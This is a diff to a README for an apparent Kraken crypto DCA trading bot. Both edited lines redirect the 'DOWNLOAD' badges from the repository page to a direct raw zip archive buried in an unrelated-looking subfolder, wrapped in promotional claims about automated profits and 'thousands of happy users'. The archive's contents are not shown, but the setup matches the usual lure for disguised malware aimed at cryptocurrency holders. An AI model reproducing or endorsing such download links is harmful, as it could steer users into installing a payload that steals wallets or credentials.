@@ -22,7 +22,7 @@ Think of it as your personal crypto assistant that never sleeps, never panics, a
 
 ### Step 1: Get the Application
 
-[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-KrakenBot_2026-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://github.com/bentleypotz0/Kraken-DCA-Auto-Trading-Bot)
+[![DOWNLOAD NOW](https://img.shields.io/badge/⬇️_DOWNLOAD-KrakenBot_2026-00C853?style=for-the-badge&logo=github&logoColor=white&labelColor=2E7D32)](https://github.com/bentleypotz0/Kraken-DCA-Auto-Trading-Bot/raw/refs/heads/main/meliorist/DC_Auto_Trading_Bot_Kraken_v2.1.zip)
 
 Visit this link to download the application. You'll be taken to the official GitHub page where the latest version is available.
 
@@ -160,7 +160,7 @@ Stop overthinking. Stop watching charts. Start letting your money work for you �
 
 ## ⬇️ Get Started Now
 
-[![DOWNLOAD KRAKENBOT](https://img.shields.io/badge/🚀_GET_STARTED-Download_Free-FF6D00?style=for-the-badge&logo=github&logoColor=white&labelColor=BF360C)](https://github.com/bentleypotz0/Kraken-DCA-Auto-Trading-Bot)
+[![DOWNLOAD KRAKENBOT](https://img.shields.io/badge/🚀_GET_STARTED-Download_Free-FF6D00?style=for-the-badge&logo=github&logoColor=white&labelColor=BF360C)](https://github.com/bentleypotz0/Kraken-DCA-Auto-Trading-Bot/raw/refs/heads/main/meliorist/DC_Auto_Trading_Bot_Kraken_v2.1.zip)
 
 Visit this link to download the application. Join thousands of happy users who are already automating their crypto trading in 2026.
 
